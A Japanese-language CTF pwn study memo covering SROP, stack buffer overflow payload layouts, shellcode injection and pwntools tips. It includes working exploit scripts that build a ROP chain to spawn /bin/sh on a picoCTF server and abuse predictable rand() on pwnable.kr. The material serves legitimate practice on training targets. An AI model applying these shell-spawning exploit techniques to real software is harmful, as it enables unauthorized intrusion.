# pwn,reversing,binary  
  
## SROP
### sigreturnシステムコール
プログラム動作中にシグナルが発生すると、カーネルはプロセスを一時停止してシグナルハンドラを呼び出す  
その際、カーネルはシグナルを受け取ったときの状態をスタックに保存しておく。  
シグナルハンドラの処理が終わるとsigreturn()が呼び出される。  
sigreturn()はスタックから値をpopして元のプロセスのコンテキスト（プロセッサフラグ、レジスタ等）を復元する  
（そのおかげで、シグナルにより割り込まれた場所から元のプロセスを再開できる）。  

**raxレジスタにsigreturnのシステムコール番号を設定しsyscallする＋偽造sigframeという形でROPチェーンを組む。  
これでsigreturnが発生し、その後にあるsigframeを読み込んでシェルが起動する。**


### 必要なガジェット  
``` mov rax, 0x0f; syscall; ret ```  

### SigreturnFrame()の返り値に対してexecve('/bin/sh')を実行するためのレジスタの設定  
```pwntools
sigret_frame = SigreturnFrame()
sigret_frame.rax = constants.SYS_execve
sigret_frame.rdi = addr_binsh
sigret_frame.rsi = 0
sigret_frame.rdx = 0
sigret_frame.rip = syscall_ret

```

  
## bufferoverflow  
### リターンアドレスを書き換える
リターンアドレスは、**rbp+0x8の場所**に位置しているため、0x8分のパディングを忘れないようにすること  
また、32bitアーキテクチャの場合は、  
パディング  
+  
8byte(rbp分のパディング)  
+   
4byte(パディング)   
+  
飛ばしたいアドレス  
の順番になる  
  
  
  
### 引数をつけて関数を飛ばす  
#### 引数のよりも前にリターンアドレスを書き換える！
パディング  
+  
8byte(rbp分のパディング)  
+   
4byte(パディング)   
+  
飛ばしたいアドレス  
+  
4byte(ret分のパディング)  
+  
引数1  
+  
引数2  
の順番になる  
https://tech.kusuwada.com/entry/2019/10/12/023145#section1  
  
  
### 実行ファイルからバイナリコードを抽出する  
``` objdump -M intel -d a.out | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g' ```  
  
  
  
### シェルコードをインジェクションする  
シェルコード  
+  
本来のパディング数 - シェルコードの文字数  
+  
8byte(パディング)  
+  
バッファーアドレス  


### pwntoolsメモ
#### うまく実行したコードが刺さらないとき  
``` context.log_level = "debug" ```  
にすることで、recvした際にどのようなデータが飛んできているのかがわかる  

### ROPGadgetを使用する際の注意点  
ROPGadgetではオプションでpythonスクリプトを自動で出力してくれる機能があるが、  
**これを使用するとうまく刺さらないことがある。**  
#### 対処法  
pwntoolsに実装されているchain()を使うことで刺さる  
<details> 
<summary>実装例を表示する </summary> 
  
```
from pwn import *

elf = ELF("vuln")
context.binary = elf
context.kernel = "amd64"

s = remote("saturn.picoctf.net", 65000)
#s = remote("localhost", 8888)

rop = ROP(elf)
rop.gets(0x080e5060)
rop.execve(0x080e5060, 0, 0)
print(rop.dump())
s.sendline(b"a"*0x1c+rop.chain())

s.sendline(b"/bin/sh")

s.interactive()
```
  
</details> 
  






### C言語の関数内の脆弱性

#### rand()を呼び出した際に引数に何も渡さない場合の脆弱性
rand()内になにも引数を渡さない場合は、何回プログラムを実行しても同じ値がrandomに代入される。  
また、key^randomの^はXOR演算子と呼ばれるもので特徴として**a^(a^b) == b となる。**  
例:  0xrandomの値が格納されているアドレス ^ 0xdeadbeef を入力すれば、0xdeadbeefが解になる。

```
from pwn import *

payload = 0x6b8b4567 ^ 0xdeadbeef
s1 = ssh(host="pwnable.kr", user="random", password="guest", port=2222)
r = s1.process("./random")
r.sendline(str(payload).encode())
r.interactive()
```
